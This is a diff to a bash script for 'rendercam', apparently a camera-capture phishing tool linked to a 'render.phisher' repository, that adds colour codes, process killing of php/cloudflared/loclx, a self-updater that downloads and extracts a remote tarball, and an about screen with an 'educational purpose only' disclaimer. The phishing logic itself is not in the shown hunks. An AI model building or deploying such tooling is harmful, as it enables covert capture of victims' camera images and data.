@@ -4,6 +4,54 @@
 
 __version__="1.0.0"
 
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
+
+## ANSI Colors (Foreground + Background)
+# Standard Colors
+BLACK="$(printf '\033[30m')"   RED="$(printf '\033[31m')"     GREEN="$(printf '\033[32m')"  
+YELLOW="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"    MAGENTA="$(printf '\033[35m')"  
+CYAN="$(printf '\033[36m')"    WHITE="$(printf '\033[37m')"   ORANGE="$(printf '\033[38;5;208m')"
+
+# Bright Colors
+BRIGHT_BLACK="$(printf '\033[90m')"   BRIGHT_RED="$(printf '\033[91m')"    
+BRIGHT_GREEN="$(printf '\033[92m')"   BRIGHT_YELLOW="$(printf '\033[93m')"  
+BRIGHT_BLUE="$(printf '\033[94m')"    BRIGHT_MAGENTA="$(printf '\033[95m')"  
+BRIGHT_CYAN="$(printf '\033[96m')"    BRIGHT_WHITE="$(printf '\033[97m')"
+
+# Background Colors
+BLACKBG="$(printf '\033[40m')"   REDBG="$(printf '\033[41m')"     GREENBG="$(printf '\033[42m')"  
+YELLOWBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"    MAGENTABG="$(printf '\033[45m')"  
+CYANBG="$(printf '\033[46m')"    WHITEBG="$(printf '\033[47m')"
+
+# Bright Background Colors
+BRIGHT_BLACKBG="$(printf '\033[100m')"   BRIGHT_REDBG="$(printf '\033[101m')"    
+BRIGHT_GREENBG="$(printf '\033[102m')"   BRIGHT_YELLOWBG="$(printf '\033[103m')"  
+BRIGHT_BLUEBG="$(printf '\033[104m')"    BRIGHT_MAGENTABG="$(printf '\033[105m')"  
+BRIGHT_CYANBG="$(printf '\033[106m')"    BRIGHT_WHITEBG="$(printf '\033[107m')"
+
+# Text Effects
+BOLD="$(printf '\033[1m')"
+DIM="$(printf '\033[2m')"
+ITALIC="$(printf '\033[3m')"
+UNDERLINE="$(printf '\033[4m')"
+INVERT="$(printf '\033[7m')"
+HIDDEN="$(printf '\033[8m')"
+STRIKE="$(printf '\033[9m')"
+
+# Reset
+RESET="$(printf '\033[0m')"
+RESETBG="$(printf '\033[49m')"
+
+
+## Reset terminal colors
+reset_color() {
+        tput sgr0   # reset attributes
+        tput op     # reset color
+        return
+}
+
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
   # We're on Windows
@@ -30,21 +78,122 @@ fi
 
 trap 'printf "\n";stop' 2
 
+## Banner
 banner() {
-clear
-printf "\033[36m                     _           \033[35m                     \e[0m\n"
-printf "\033[36m                    | |          \033[35m                     \e[0m\n"
-printf "\033[36m  _ __ ___ _ __   __| | ___ _ __ \033[35m  ___ __ _ _ __ ___  \e[0m\n"
-printf "\033[36m |  __/ _ \  _ \ / _  |/ _ \  __|\033[35m / __/ _  |  _   _ \ \e[0m\n"
-printf "\033[36m | | |  __/ | | | (_| |  __/ |\033[35m   | (_| (_| | | | | | |\e[0m\n"
-printf "\033[36m |_|  \___|_| |_|\__,_|\___|_|\033[35m    \___\__,_|_| |_| |_|\e[0m\n"
-printf " \e[1;93m Tool created by Render             Version: ${__version__} \e[0m \n"
-printf "\n"
+    cat << EOF
+ ${CYAN}                     _
+ ${CYAN}                    | |
+ ${CYAN}  _ __ ___ _ __   __| | ___ _ __   ___ __ _ _ __ ___   
+ ${CYAN} |  __/ _ \  _ \ / _  |/ _ \  __| / __/ _  |  _   _ \  
+ ${CYAN} | | |  __/ | | | (_| |  __/ |   | (_| (_| | | | | | | 
+ ${CYAN} |_|  \___|_| |_|\__,_|\___|_|    \___\__,_|_| |_| |_| 
+ ${CYAN}     ${RED}Tool created by Render${CYAN}             ${RED}Version: ${__version__} 
+
+EOF
 }
 
+## Install Dependencies
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 }
+
+## Kill already running process
+kill_pid() {
+        check_PID="php cloudflared loclx"
+        for process in ${check_PID}; do
+                if [[ $(pidof ${process}) ]]; then # Check for Process
+                        killall ${process} > /dev/null 2>&1 # Kill the Process
+                fi
+        done
+}
+
+# Check for new update
+check_update() {
+  local release_url='https://api.github.com/repos/render437/render.phisher/releases/latest'
+  local ua='render-phisher-updater/1.0 (+https://example.com)'
+  local tmpfile new_version tarball_url
+
+  # Prerequisites check
+  for cmd in curl tar mktemp awk grep; do
+    command -v "$cmd" >/dev/null 2>&1 || {
+      echo "[!] Required command '$cmd' not found"
+      return 1
+    }
+  done
+
+  [ -n "$__version__" ] || { echo "[!] __version__ not set"; return 1; }
+  [ -n "$BASE_DIR" ]   || { echo "[!] BASE_DIR not set"; return 1; }
+
+  echo -ne "\n${BRIGHT_GREEN} Checking for update: "
+
+  # --- Get latest version safely ---
+  if command -v jq >/dev/null 2>&1; then
+    new_version=$(curl -sS -A "$ua" "$release_url" | jq -r '.tag_name // .name // empty')
+  else
+    new_version=$(curl -sS -A "$ua" "$release_url" \
+      | grep -E '"tag_name"|"name"' \
+      | head -n1 \
+      | awk -F\" '{print $4}')
+  fi
+
+  if [ -z "$new_version" ]; then
+    echo -e "${ORANGE}Could not determine latest version.${WHITE}"
+    return 1
+  fi
+
+  tarball_url="https://github.com/render437/render.phisher/archive/refs/tags/${new_version}.tar.gz"
+
+  # --- Compare versions ---
+  if [[ "$new_version" != "$__version__" ]]; then
+    echo -e "${ORANGE}Update found${WHITE}"
+    sleep 1
+    echo -ne "\n${BRIGHT_GREEN} Downloading Update..."
+
+    tmpfile=$(mktemp /tmp/render.phisher.XXXXXX.tar.gz) \
+      || { echo "[!] mktemp failed"; return 1; }
+
+    # Download safely with retries
+    if ! curl --fail --show-error --retry 3 --retry-delay 2 -L \
+      -A "$ua" -o "$tmpfile" "$tarball_url"; then
+      echo -e "\n${RED} Error occurred while downloading.${WHITE}"
+      rm -f "$tmpfile"
+      return 1
+    fi
+
+    # Ensure BASE_DIR exists
+    if [ ! -d "$BASE_DIR" ] && ! mkdir -p "$BASE_DIR"; then
+      echo -e "\n${RED} Cannot create BASE_DIR: $BASE_DIR${WHITE}"
+      rm -f "$tmpfile"
+      return 1
+    fi
+
+    # Extract safely
+    if ! tar -xzf "$tmpfile" -C "$BASE_DIR" --strip-components=1 >/dev/null 2>&1; then
+      echo -e "\n\n${RED} Error occurred while extracting.${WHITE}"
+      rm -f "$tmpfile"
+      return 1
+    fi
+
+    rm -f "$tmpfile"
+    { sleep 1; clear; banner_small; } 2>/dev/null
+    echo -e "\n${BRIGHT_GREEN} Successfully updated to ${new_version}! Run render.phisher again\n"
+    reset_color 2>/dev/null || true
+    return 0
+
+  else
+    echo -e "${GREEN}Up to date${WHITE}"
+    sleep .5
+    return 0
+  fi
+}
+
+## Check Internet Status
+check_status() {
+        echo -ne "\n${CYAN} Internet Status: "
+        timeout 3s curl -fIs "https://api.github.com" > /dev/null
+        [ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e ""
+}
+
 
 stop() {
 if [[ "$windows_mode" == true ]]; then
@@ -484,6 +633,45 @@ payload_localhost() {
   rm -rf index3.html
 }
 
+## Exit message
+msg_exit() {
+        { clear; banner; echo; }
+        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+        { reset_color; exit 0; }
+}
+
+## About
+about() {
+        { clear; banner; echo; }
+        cat <<- EOF
+                ${BRIGHT_GREEN} Author:   ${BRIGHT_BLUE}render437
+                ${BRIGHT_GREEN} Github:   ${BRIGHT_BLUE}https://github.com/render437
+                ${BRIGHT_GREEN} Version:  ${BRIGHT_BLUE}${__version__}
+
+                ${RED}Warning:
+                ${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}
+                ${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}
+
+                ${ORANGE}Contributors:
+                ${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek
+
+                ${BRIGHT_MAGENTA}0. Main Menu     ${BRIGHT_MAGENTA}99. Exit
+
+        EOF
+
+        echo
+        read -p "${MAGENTA}Select an option:"
+        case $REPLY in 
+                99)
+                        msg_exit;;
+                0 | 00)
+                        echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+                        { sleep 1; rendercam; };;
+                *)
+                        echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+                        { sleep 1; about; };;
+        esac
+}
 
 rendercam() {
 if [[ -e sendlink ]]; then
@@ -553,7 +741,9 @@ select_template() {
     esac
 }
 
-
-banner
+## Main
+kill_pid
 dependencies
+check_status
+banner
 rendercam
